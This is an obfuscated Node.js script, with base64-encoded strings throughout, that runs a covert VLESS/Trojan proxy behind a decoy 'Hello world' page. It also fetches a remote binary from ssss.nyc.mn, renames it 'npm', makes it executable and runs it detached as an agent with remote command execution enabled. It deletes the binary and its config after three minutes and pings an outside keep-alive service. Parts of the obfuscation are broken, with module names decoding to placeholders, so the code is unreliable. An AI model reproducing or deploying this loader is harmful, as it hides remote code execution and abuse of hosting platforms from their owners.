(function(){const _0 = require(atob('XzA='));const _1 = require(atob('XzE='));const _2 = require(atob('XzI='));const _3 = require(atob('XzM='));const _4 = require(atob('XzQ='));const _5 = require(atob('XzU='));const _6 = require(atob('XzY='));const {Buffer }= require(atob('YnVmZmVy'));const {exec, execSync }= require(atob('Y2hpbGRfcHJvY2Vzcw=='));const {WebSocket, createWebSocketStream }= require(atob('d3M='));const _7 = process.env._7 || atob('YmJlMjc0YTItMDNmMC00NzkxLWEzNDgtMjY1NmQ0OWZmOGYz');// 运行哪吒v1,在不同的平台需要改_7,否则会被覆盖 const _8 = process.env._8 || atob('');// 哪吒v1填写形式：nz.abc.com:8008 哪吒v0填写形式：nz.abc.com const _9 = process.env._9 || atob('');// 哪吒v1没有此变量，v0的agent端口为{443,8443,2096,2087,2083,2053}其中之一时开启tls const _a = process.env._a || atob('');// v1的NZ_CLIENT_SECRET或v0的agent端口 const _b = process.env._b || atob('MTIzNC5hYmMuY29t');// 填写项目域名或已反代的域名，不带前缀，例如：abc-domain.com const _c = process.env._c || false;// 是否开启自动访问保活,false为关闭,true为开启,需同时填写_b变量 const _d = process.env._d || _7.slice(0, 8);// 节点路径，默认获取_t前8位 const _e = process.env._e || atob('c3Vi');// 获取节点的订阅路径 const _f = process.env._f || atob('SHVn');// 节点名称 const _g = process.env._g || 7860;// _1和ws服务端口 let _h = atob('');const _i = async () => {try {const _j = await _3.get(atob('aHR0cHM6Ly9hcGkuX3kuc2IvZ2VvaXA='));const _k = _j._k;_h = `${_k.country_code}-${_k.isp}`.replace(/ /g, atob('Xw=='));}catch (e) {_h = atob('VW5rbm93bg==');}}_i();const _l = _1.createServer((req, _j) => {if (req._1e === atob('Lw==')) {const _m = _5.join(__dirname, atob('aW5kZXguaHRtbA=='));_2.readFile(_m, atob('dXRmOA=='), (err, content) => {if (err) {_j.writeHead(200, {atob('Q29udGVudC1UeXBl'): atob('dGV4dC9odG1s') });_j.end(atob('SGVsbG8gd29ybGQh'));return;}_j.writeHead(200, {atob('Q29udGVudC1UeXBl'): atob('dGV4dC9odG1s') });_j.end(content);});return;}else if (req._1e === `/${_e}`) {const _n = _f ? `${_f}-${_h}` : _h;const _o = `vless://${_7}@${_b}:443?encryption=none&security=tls&sni=${_b}&fp=chrome&type=ws&_13=${_b}&_5=%2F${_d}#${_n}`;const _p = `trojan://${_7}@${_b}:443?security=tls&sni=${_b}&fp=chrome&type=ws&_13=${_b}&_5=%2F${_d}#${_n}`;const _q = _o + atob('XG4=') + _p;const _r = Buffer.from(_q).toString(atob('YmFzZTY0'));_j.writeHead(200, {atob('Q29udGVudC1UeXBl'): atob('dGV4dC9wbGFpbg==') });_j.end(_r + atob('XG4='));}else {_j.writeHead(404, {atob('Q29udGVudC1UeXBl'): atob('dGV4dC9wbGFpbg==') });_j.end(atob('Tm90IEZvdW5kXG4='));}});const _s = new WebSocket.Server({server: _l });const _t = _7.replace(/-/g, atob(""));const _u = [atob('OC44LjQuNA=='), atob('MS4xLjEuMQ==')];// Custom DNS function _1u(_13) {return new Promise((resolve, reject) => {if (/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(_13)) {resolve(_13);return;}let _v = 0;function _1v() {if (_v >= _u.length) {reject(new Error(`Failed to resolve ${_13}with all DNS servers`));return;}const _w = _u[_v];_v++;const _x = `https://dns.google/resolve?name=${encodeURIComponent(_13)}&type=A`;_3.get(_x, {timeout: 5000, headers: {atob('QWNjZXB0'): atob('YXBwbGljYXRpb24vZG5zLWpzb24=') }}) .then(_1j => {const _k = _1j._k;if (_k.Status === 0 && _k.Answer && _k.Answer.length > 0) {const _y = _k.Answer.find(record => record.type === 1);if (_y) {resolve(_y._k);return;}}_1v();}) .catch(error => {_1v();});}_1v();});}// VLE-SS处理 function _1w(ws, msg) {const [VERSION] = msg;const _z = msg.slice(1, 17);if (!_z.every((v, _10) => v == parseInt(_t.substr(_10 * 2, 2), 16))) return false;let _10 = msg.slice(17, 18).readUInt8() + 19;const _11 = msg.slice(_10, _10 += 2).readUInt16BE(0);const _12 = msg.slice(_10, _10 += 1).readUInt8();const _13 = _12 == 1 ? msg.slice(_10, _10 += 4).join(atob('Lg==')) : (_12 == 2 ? new TextDecoder().decode(msg.slice(_10 + 1, _10 += 1 + msg.slice(_10, _10 + 1).readUInt8())) : (_12 == 3 ? msg.slice(_10, _10 += 16).reduce((s, b, _10, a) => (_10 % 2 ? s.concat(a.slice(_10 - 1, _10 + 1)) : s), []).map(b => b.readUInt16BE(0).toString(16)).join(atob('Og==')) : atob('')));ws.send(new Uint8Array([VERSION, 0]));const _14 = createWebSocketStream(ws);_1u(_13) .then(resolvedIP => {_4.connect({_13: resolvedIP, _11 }, function() {this.write(msg.slice(_10));_14.on(atob('ZXJyb3I='), () => {}).pipe(this).on(atob('ZXJyb3I='), () => {}).pipe(_14);}).on(atob('ZXJyb3I='), () => {});}) .catch(error => {_4.connect({_13, _11 }, function() {this.write(msg.slice(_10));_14.on(atob('ZXJyb3I='), () => {}).pipe(this).on(atob('ZXJyb3I='), () => {}).pipe(_14);}).on(atob('ZXJyb3I='), () => {});});return true;}// Tro-jan处理 function _1x(ws, msg) {try {if (msg.length < 58) return false;const _15 = msg.slice(0, 56).toString();const _16 = [ _7, ];let _17 = null;for (const _18 of _16) {const _19 = _6.createHash(atob('c2hhMjI0')).update(_18).digest(atob('aGV4'));if (_19 === _15) {_17 = _18;break;}}if (!_17) return false;let _1a = 56;if (msg[_1a] === 0x0d && msg[_1a + 1] === 0x0a) {_1a += 2;}const _1b = msg[_1a];if (_1b !== 0x01) return false;_1a += 1;const _1c = msg[_1a];_1a += 1;let _13, _11;if (_1c === 0x01) {_13 = msg.slice(_1a, _1a + 4).join(atob('Lg=='));_1a += 4;}else if (_1c === 0x03) {const _1d = msg[_1a];_1a += 1;_13 = msg.slice(_1a, _1a + _1d).toString();_1a += _1d;}else if (_1c === 0x04) {_13 = msg.slice(_1a, _1a + 16).reduce((s, b, _10, a) => (_10 % 2 ? s.concat(a.slice(_10 - 1, _10 + 1)) : s), []) .map(b => b.readUInt16BE(0).toString(16)).join(atob('Og=='));_1a += 16;}else {return false;}_11 = msg.readUInt16BE(_1a);_1a += 2;if (_1a < msg.length && msg[_1a] === 0x0d && msg[_1a + 1] === 0x0a) {_1a += 2;}const _14 = createWebSocketStream(ws);_1u(_13) .then(resolvedIP => {_4.connect({_13: resolvedIP, _11 }, function() {if (_1a < msg.length) {this.write(msg.slice(_1a));}_14.on(atob('ZXJyb3I='), () => {}).pipe(this).on(atob('ZXJyb3I='), () => {}).pipe(_14);}).on(atob('ZXJyb3I='), () => {});}) .catch(error => {_4.connect({_13, _11 }, function() {if (_1a < msg.length) {this.write(msg.slice(_1a));}_14.on(atob('ZXJyb3I='), () => {}).pipe(this).on(atob('ZXJyb3I='), () => {}).pipe(_14);}).on(atob('ZXJyb3I='), () => {});});return true;}catch (error) {return false;}}// Ws 连接处理 _s.on(atob('Y29ubmVjdGlvbg=='), (ws, req) => {const _1e = req._1e || atob('');ws.once(atob('bWVzc2FnZQ=='), msg => {if (msg.length > 17 && msg[0] === 0) {const _z = msg.slice(1, 17);const _1f = _z.every((v, _10) => v == parseInt(_t.substr(_10 * 2, 2), 16));if (_1f) {if (!_1w(ws, msg)) {ws.close();}return;}}if (!_1x(ws, msg)) {ws.close();}}).on(atob('ZXJyb3I='), () => {});});const _1g = () => {const _1h = _0._1h();if (_1h === atob('YXJt') || _1h === atob('YXJtNjQ=') || _1h === atob('YWFyY2g2NA==')) {if (!_9) {return atob('aHR0cHM6Ly9hcm02NC5zc3NzLm55Yy5tbi92MQ==');}else {return atob('aHR0cHM6Ly9hcm02NC5zc3NzLm55Yy5tbi9hZ2VudA==');}}else {if (!_9) {return atob('aHR0cHM6Ly9hbWQ2NC5zc3NzLm55Yy5tbi92MQ==');}else {return atob('aHR0cHM6Ly9hbWQ2NC5zc3NzLm55Yy5tbi9hZ2VudA==');}}};const _1i = async () => {if (!_8 && !_a) return;try {const _1e = _1g();const _1j = await _3({method: atob('Z2V0'), _1e: _1e, responseType: atob('c3RyZWFt') });const _1k = _2.createWriteStream(atob('bnBt'));_1j._k.pipe(_1k);return new Promise((resolve, reject) => {_1k.on(atob('ZmluaXNo'), () => {console.log(atob('bnBtIGRvd25sb2FkIHN1Y2Nlc3NmdWxseQ=='));exec(atob('Y2htb2QgK3ggbnBt'), (err) => {if (err) reject(err);resolve();});});_1k.on(atob('ZXJyb3I='), reject);});}catch (err) {throw err;}};const _1l = async () => {try {const _1m = execSync(atob('cHMgYXV4IHwgZ3JlcCAtdiBhdG9iKCJaM0psY0E9PSIpIHwgZ3JlcCBhdG9iKCJMaTliYmwxd2JRPT0iKQ=='), {encoding: atob('dXRmLTg=') });if (_1m.trim() !== atob('')) {console.log(atob('bnBtIGlzIGFscmVhZHkgcnVubmluZywgc2tpcCBydW5uaW5nLi4u'));return;}}catch (e) {// 进程不存在时继续运行nezha }await _1i();let _1n = atob('');let _1o = [atob('NDQz'), atob('ODQ0Mw=='), atob('MjA5Ng=='), atob('MjA4Nw=='), atob('MjA4Mw=='), atob('MjA1Mw==')];if (_8 && _9 && _a) {const _1p = _1o.includes(_9) ? atob('LS10bHM=') : atob('');_1n = `setsid nohup ./npm -s ${_8}:${_9}-p ${_a}${_1p}--disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`;}else if (_8 && _a) {if (!_9) {const _11 = _8.includes(atob('Og==')) ? _8.split(atob('Og==')).pop() : atob('');const _1q = _1o.includes(_11) ? atob('dHJ1ZQ==') : atob('ZmFsc2U=');const _1r = `client_secret: ${_a}debug: false disable_auto_update: true disable_command_execute: false disable_force_update: true disable_nat: false disable_send_query: false gpu: false insecure_tls: true ip_report_period: 1800 report_delay: 4 server: ${_8}skip_connection_count: true skip_procs_count: true temperature: false tls: ${_1q}use_gitee_to_upgrade: false use_ipv6_country_code: false _t: ${_7}`;_2.writeFileSync(atob('Y29uZmlnLnlhbWw='), _1r);}_1n = `setsid nohup ./npm -c config.yaml >/dev/null 2>&1 &`;}else {console.log(atob('TkVaSEEgdmFyaWFibGUgaXMgZW1wdHksIHNraXAgcnVubmluZw=='));return;}try {exec(_1n, {shell: atob('L2Jpbi9iYXNo') }, (err) => {if (err) console.error(atob('bnBtIHJ1bm5pbmcgZXJyb3I6'), err);else console.log(atob('bnBtIGlzIHJ1bm5pbmc='));});}catch (error) {console.error(`error: ${error}`);}};async function _1y() {if (!_c) return;if (!_b) {return;}const _1s = `https://${_b}`;try {const _j = await _3.post(atob("aHR0cHM6Ly9vb29vLnNlcnYwMC5fNC9hZGQtXzFl"), {_1e: _1s }, {headers: {atob('Q29udGVudC1UeXBl'): atob('YXBwbGljYXRpb24vanNvbg==') }});console.log(atob('QXV0b21hdGljIEFjY2VzcyBUYXNrIGFkZGVkIHN1Y2Nlc3NmdWxseQ=='));}catch (error) {// console.error(atob('RXJyb3IgYWRkaW5nIFRhc2s6'), error.message);}}const _1t = () => {_2.unlink(atob('bnBt'), () => {});_2.unlink(atob('Y29uZmlnLnlhbWw='), () => {});};_l.listen(_g, () => {_1l();setTimeout(() => {_1t();}, 180000);_1y();console.log(`Server is running on _11 ${_g}`);});})();
